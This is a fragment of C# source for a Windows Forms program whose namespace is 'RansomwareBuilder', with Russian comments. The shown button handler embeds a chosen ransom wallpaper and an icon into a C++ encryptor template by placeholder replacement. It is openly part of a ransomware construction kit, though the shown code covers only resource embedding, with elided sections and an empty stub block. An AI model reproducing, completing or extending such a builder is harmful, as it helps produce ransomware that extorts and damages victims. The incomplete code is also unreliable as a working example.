...
namespace RansomwareBuilder
{
    public partial class Form1 : Form
    {
        ...
        // ============================================================
        // ВКЛАДКИ (полный код с интерфейсом)
        // ============================================================
        ...
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                ...
                // ============================================================
                // ВШИВАНИЕ ОБОЕВ В РЕСУРСЫ (КАК ФАЙЛ)
                // ============================================================
                if (!string.IsNullOrEmpty(wallpaperPath) && File.Exists(wallpaperPath))
                {
                    ...
                    // Создаём .res файл с картинкой
                    string resPath = Path.GetTempFileName() + ".res";
                    using (var fs = new FileStream(resPath, FileMode.Create))
                    using (var bw = new BinaryWriter(fs))
                    {
                        // Заголовок ресурса
                        // 0x0000 - тип ресурса (IMAGE)
                        // IDB_WALLPAPER = 101
                        // Данные картинки
                        
                        // Упрощённый вариант: просто сохраняем в шаблон как ресурс
                        // В C++ шаблоне используется FindResourceA с IDB_WALLPAPER
                    }
                    
                    // В C++ шаблоне уже есть загрузка из ресурсов
                    // Просто передаём картинку как данные
                    // Для простоты вставляем как Base64 (но в ресурсы)
                    // Но если нужен реальный ресурс — нужен rc файл
                    // Для автоматической сборки проще оставить Base64
                    // но чтобы работало — в C++ уже есть set_wallpaper_from_resource()
                    
                    // Передаём картинку в шаблон как данные
                    // В C++ шаблоне будет функция SetWallpaperFromResource()
                    // которая загружает ресурс IDB_WALLPAPER
                    
                    // Временно: сохраняем как Base64, но в финальной версии — как ресурс
                    ReplaceString(template, "|WALLPAPER|", Convert.ToBase64String(imageData));
                    ReplaceString(template, "|WALLPAPER_EXT|", ext);
                }
                
                // ============================================================
                // ВШИВАНИЕ ИКОНКИ В РЕСУРСЫ (ДЛЯ ШИФРОВАЛЬЩИКА)
                // ============================================================
                if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                {
                    // Иконка будет вшита в шаблон как ресурс
                    // Для этого нужно заменить в шаблоне заглушку
                    byte[] iconData = File.ReadAllBytes(iconPath);
                    // В C++ шаблоне будет IDI_ICON = 100
                    // Пока сохраняем как данные
                    
                    // Для простоты сохраняем в ресурсы через rc
                    // Или просто копируем в папку
